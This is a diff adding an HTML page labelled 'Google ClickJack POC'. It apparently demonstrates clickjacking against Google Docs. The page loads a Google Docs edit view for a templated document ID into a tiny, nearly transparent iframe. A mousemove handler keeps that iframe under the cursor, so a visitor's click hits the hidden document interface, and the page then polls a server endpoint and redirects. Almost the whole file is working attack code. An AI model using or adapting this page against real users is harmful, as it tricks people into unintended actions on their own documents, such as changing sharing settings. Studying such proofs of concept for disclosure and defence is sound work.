@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Click Jack</title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+	<script>
+	$(function() {
+		$(document).on('mousemove', function(e){
+	    	$('#cksl6').css({
+				left:  e.pageX-10,
+				top:   e.pageY-10
+	    	});
+		});
+		
+		window.addEventListener('blur', function(){
+			console.log('off_win');
+			
+			document.getElementById('stat').innerHTML = 'loading...'
+			/*
+			setTimeout(function(){
+				$('#cksl6').hide();
+			},500);
+			*/
+	  		window.setInterval(function(){
+	  			$.ajax({
+	  			  url: "/done",
+	  			  success: function( data ) {
+	  			    if(data){
+	  					location.href='/';
+	  					//console.log(data);
+	  				}
+	  			  }
+	  			});
+	  		},500);
+		});
+			
+	});
+	</script>
+	
+  </head>
+  <body>
+	<h1>Google ClickJack POC</h1>
+    <p>Move your mouse around then click anywhere on the page.</p>
+	
+	<div style="overflow: hidden; width: 20px; height: 20px; position:absolute; left:30;top:30px;opacity:0.2;filter:alpha(opacity=20);" id="cksl6">
+	<iframe name="cksl7" src="https://docs.google.com/a/m-austin.com/file/d/<%= doc_id %>/edit" id="i_frame" style="border: 0pt none ; left: -285px; top: -393px; position: absolute; width: 1233px; height: 435px;" scrolling="no"></iframe></div>
+	<div id="stat"></div>
+  </body>
+</html>
